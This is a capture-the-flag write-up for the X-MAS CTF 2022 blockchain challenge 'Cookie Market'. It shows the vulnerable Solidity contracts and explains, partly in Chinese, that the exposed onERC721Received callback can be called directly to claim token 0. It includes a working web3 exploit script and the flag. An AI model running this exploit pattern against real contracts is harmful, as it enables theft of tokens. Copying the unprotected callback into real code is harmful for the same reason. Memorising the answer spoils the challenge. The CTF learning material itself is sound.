---
title: Blockchain - Cookie Market
description: 2022 | X-MAS CTF | Blockchain
tags:
    - smart contract
---

## 题目

The cookie market is bustling with activity as vendors sell their festive treats and holiday shoppers rush to find the perfect cookies for their loved ones.

As Santa Claus makes his way through the market, he is greeted with warm smiles and cheerful greetings from the vendors and shoppers alike. Children run up to him, excited to see the jolly old man in person, and Santa takes the time to chat with them and hear their holiday wishes.

As he moves from booth to booth, Santa tastes a variety of cookies, from classic sugar cookies decorated with frosting and sprinkles, to more exotic flavors like gingerbread and spiced shortbread. He even tries his hand at decorating a few cookies himself, much to the delight of the children watching.

After he has gathered all the supplies he needs, Santa thanks the vendors and shoppers for their hospitality and heads back to his workshop to begin preparing for his long journey. As he sets off, he is filled with the warmth and joy of the holiday season, knowing that he will bring a little bit of that magic to every child he visits.

> nc challs.htsp.ro 9002

??? note "cookie.sol"

    ```js
    // SPDX-License-Identifier: MIT
    pragma solidity 0.8.17;

    import "./ERC721.sol";

    contract Cookie is ERC721("cookie", "E") {

        uint256 public cookieIDX;
        address public owner;

        constructor(){
            cookieIDX = 0;
        }

        // @dev mints an cookie. Note that there are only 10 cookies in the basket.
        function mintcookie() external {
            require(cookieIDX < 10);
            _mint(msg.sender, cookieIDX);
            cookieIDX += 1;
        }

    }
    ```

??? note "CookieMarket.sol"

    ```js
    // SPDX-License-Identifier: MIT
    pragma solidity 0.8.17;

    import "./IERC721.sol";
    import "./IERC721Receiver.sol";

    contract CookieMarket is IERC721Receiver {

        // mapping that handles ownership of the cookies within the CookieMarket.
        mapping(uint256 => address) public canRedeemcookie;
        
        // struct that handles the orders in the market
        struct sell_Order {
            uint256 cookie_idx_offered;    // the ERC721 idx of the "cookie" token.
            uint256 amount_eth_wanted;  // the amount of ETH the seller wants to receive for the cookie.
            address cookie_provider;       // the address of the seller.
        }

        // storing all the sell orders in the market.
        sell_Order[] public sellOrders;

        // cookie
        IERC721 public cookie;
        
        /**
            @dev cookieMarket constructor.

            @param _cookie ERC721 contract instance.
        */
        constructor(address _cookie) {
            cookie = IERC721(_cookie);
        }

        /**
            @dev Allows a buyer to buy an cookie from the cookieMarket via exhausting its subsequent sell order.

            @param _idx The ERC721 idx of the cookie.
            @param _owner The `current` owner of the cookie.
        */
        function executeOrder(uint256 _idx, address _owner) external payable {

            require(
                msg.sender != _owner, 
                "err: no self-exchanges allowed"
            );

            // find the sellOrder whose cookie_idx_offered == _idx
            for (uint256 i = 0; i < sellOrders.length; i++) {
                if (sellOrders[i].cookie_idx_offered == _idx) {

                    // check if the _owner is the seller
                    require(sellOrders[i].cookie_provider == _owner, "err: _owner != seller");

                    // the cookie is for sale.
                    
                    // check if the msg.sender has provided enough ETH to pay for the cookie
                    if (msg.value >= sellOrders[i].amount_eth_wanted) {

                        // the _owner has enough ETH to pay for the cookie
                        // paying the seller(current owner) of the cookie
                        (bool sent, bytes memory data) = _owner.call{value: msg.value}("");
                        require(sent, "err: transfer failed");

                        // transfer the ownership of the cookie from the seller to the buyer
                        canRedeemcookie[_idx] = msg.sender;

                        // remove the sellOrder from the sellOrders array
                        sellOrders[i] = sellOrders[sellOrders.length - 1];
                        sellOrders.pop();

                        break;
                    }
                }
            }
        }

        /**
            @dev Function to retrieve an cookie from the market.
            
            @param _idx The index of the cookie in the market.
        */
        function redeemcookies(uint256 _idx) external {

            // check if sender can redeem the cookie
            require(
                canRedeemcookie[_idx] == msg.sender,
                "err: msg.sender != owner(cookie)"
            );

            // approve the cookie transfer.
            cookie.approve(
                msg.sender, 
                _idx
            );

            // transfer the ownership of the cookie.
            cookie.transferFrom(
                address(this), 
                msg.sender, 
                _idx
            );

            // remove the cookie _idx from the canRedeemcookie mapping
            delete canRedeemcookie[_idx];
        }

        /**
            @dev Function to effectively add a sellOrder for your cookie on the cookieMarket.
            
            @param _cookieIDX The index of the ERC721 cookie.
            @param _ethWanted The amount of ETH the seller wants to receive for the cookie.
        */
        function addSellOrder(uint256 _cookieIDX, uint256 _ethWanted) external {

            // check whether the msg.sender can sell the _cookieIDX
            require(
                canRedeemcookie[_cookieIDX] == msg.sender,
                "err: msg.sender != owner(cookie[_cookieIDX])"
            );

            // create the new sellOrder
            sell_Order memory newOrder;
            newOrder.cookie_idx_offered = _cookieIDX;
            newOrder.amount_eth_wanted = _ethWanted;
            newOrder.cookie_provider = msg.sender;

            sellOrders.push(newOrder);
        }

        /**
            @dev Function to effectively remove a sellOrder from the cookieMarket.
            
            @param _cookieIDX The index of the ERC721 cookie.
        */
        function removeSellOrder(uint256 _cookieIDX) external {

            // iterate through all sellOrders
            for(uint256 i = 0; i < sellOrders.length; i++) {

                // check if the sellOrder is for the _cookieIDX
                if (sellOrders[i].cookie_idx_offered == _cookieIDX) {
                    
                    // check if the msg.sender is the owner of the cookie
                    require(
                        sellOrders[i].cookie_provider == msg.sender,
                        "err: msg.sender != cookie_provider"
                    );

                    // delete the sellOrder
                    sellOrders[i] = sellOrders[sellOrders.length - 1];
                    sellOrders.pop();
                    break;
                }
            }
        }

        /**
            @dev Inherited from IERC721Receiver.
        */
        function onERC721Received(
            address,
            address _from,
            uint256 _tokenId,
            bytes calldata
        ) external override returns (bytes4) {

            // we have received an cookie from its owner; mark that in the redeem mapping
            canRedeemcookie[_tokenId] = _from;
            
            return this.onERC721Received.selector; 
        }
    }
    ```

### Hint

Retrieve the OG cookie to get the flag!

## 解题思路

- 需要获得编号 0 的 cookie，初始由 deployer 获得并转给合约 `CookieMarket`
- 根据 `canRedeemcookie` 的记录，可以通过函数 `redeemcookies` 赎回指定编号的 cookie，直接调用 `onERC721Received` 更新编号为 0 的 cookie 所有者再赎回即可
    - 因为 `onERC721Received` 是 hook 函数，起初并没有意识到可以被直接调用 XD

### Exploit

```py
from web3 import Web3
from pwn import *

def transact(func, gas=1000000):
    tx = account.sign_transaction(eval(func).buildTransaction({
        'chainId': w3.eth.chain_id,
        'nonce': w3.eth.get_transaction_count(account.address),
        'gas': gas,
        'gasPrice': w3.eth.gas_price,
    })).rawTransaction
    tx_hash = w3.eth.send_raw_transaction(tx).hex()
    return w3.eth.wait_for_transaction_receipt(tx_hash)

conn = remote('challs.htsp.ro', 9002)

conn.sendlineafter('action?', '1')
uuid = conn.recvline_contains('uuid').decode().split(' ')[-1].strip()
w3 = Web3(Web3.HTTPProvider(conn.recvline_contains('rpc').decode().split(' ')[-1]))
account = w3.eth.account.from_key(conn.recvline_contains('key').decode().split(' ')[-1])

deployer_addr = conn.recvline_contains('contract').decode().split(' ')[-1].strip()

cookie_addr = w3.toChecksumAddress(w3.eth.get_storage_at(deployer_addr, 0).hex()[-40:])
cookie_abi = open('cookie_abi.json').read()
cookie_contract = w3.eth.contract(address=cookie_addr, abi=cookie_abi)

market_addr = w3.toChecksumAddress(w3.eth.get_storage_at(deployer_addr, 1).hex()[-40:])
market_abi = open('market_abi.json').read()
market_contract = w3.eth.contract(address=market_addr, abi=market_abi)

transact('market_contract.functions.onERC721Received(account.address, account.address, 0, "")')
transact('market_contract.functions.redeemcookies(0)')

conn = remote('challs.htsp.ro', 9002)
conn.sendlineafter('action?', '3')
conn.sendlineafter('uuid please:', uuid)
conn.sendlineafter('contract address please:', deployer_addr)
conn.interactive()
```

### Flag

> X-MAS{rotten_cookies_spoil_the_market}